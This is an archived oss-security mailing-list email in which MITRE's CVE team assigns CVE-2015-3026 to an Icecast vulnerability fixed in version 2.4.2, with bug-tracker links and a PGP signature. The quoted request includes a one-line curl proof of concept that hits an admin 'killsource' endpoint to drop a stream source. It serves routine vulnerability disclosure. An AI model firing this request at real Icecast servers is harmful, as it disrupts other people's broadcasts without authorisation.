X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1075" "Wednesday" "8" "April" "2015" "16:02:40" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20150408200240.0DEC46C00B0@smtpvmsrv1.mitre.org>" "29" "[oss-security] Re: CVE Request for Icecast 2.3.3, 2.4.0, 2.4.1, fixed in 2.4.2" nil nil nil "4" "2015040820:02:40" "[oss-security] Re: CVE Request for Icecast 2.3.3, 2.4.0, 2.4.1, fixed in 2.4.2" (number mark "        cve-assign@m Apr  8   29/1075  " thread-indent "\"[oss-security] Re: CVE Request for Icecast 2.3.3, 2.4.0, 2.4.1, fixed in 2.4.2\"\n") "<5525271C.6080907@ruecker.fi>" ("<5525271C.6080907@ruecker.fi>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 18362 invoked by uid 550); 8 Apr 2015 20:02:52 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 18344 invoked from network); 8 Apr 2015 20:02:52 -0000
In-Reply-To: <5525271C.6080907@ruecker.fi>
Message-Id: <20150408200240.0DEC46C00B0@smtpvmsrv1.mitre.org>
Cc: cve-assign@mitre.org, oss-security@lists.openwall.com
Date: Wed,  8 Apr 2015 16:02:40 -0400 (EDT)
From: cve-assign@mitre.org
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Re: CVE Request for Icecast 2.3.3, 2.4.0, 2.4.1, fixed in 2.4.2
To: thomas@ruecker.fi

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

> Proof of concept:
> curl "http://example.org:8000/admin/killsource?mount=/test.ogg"

> https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=782120
> https://trac.xiph.org/ticket/2191
> http://lists.xiph.org/pipermail/icecast-dev/2015-April/002460.html
> https://trac.xiph.org/changeset/27abfbbd688df3e3077b535997330aa06603250f/icecast-server

Use CVE-2015-3026.

- -- 
CVE assignment team, MITRE CVE Numbering Authority
M/S M300
202 Burlington Road, Bedford, MA 01730 USA
[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.14 (SunOS)

iQEcBAEBAgAGBQJVJYi2AAoJEKllVAevmvms858IAI8wg3JmqdfCvZxkAxnR6F15
pcYt1qveLRqwK33Y3Og7ZGfGsO1xaKdY/af1RbTzklvYA1SrnZjmjqdF8R8+fZwe
lCKWOhlHSxmEuEJo4XyMt2ZWP9LZ5h2MwqVNAwFqQ4/BfTesEWB0beV37jzmWejQ
bVVg6irkB8kHvoXCcCwhtj/Gc5cSrAdQHuep8wz2PnYyv1aH9FMtrBIQlX1ujwC3
EUYgpVUpckvPK7EEmyMwQq7nKU3h+JsSHaJJAPfffre//7WF4BTcqT0R1Bfw6ekK
cLaRbSgQwq/mknq28bq0BGq3ihtMVoH/bfmqWPcVaCbtDRTjGZ7EIRQs7GKQvT0=
=5Sv4
-----END PGP SIGNATURE-----
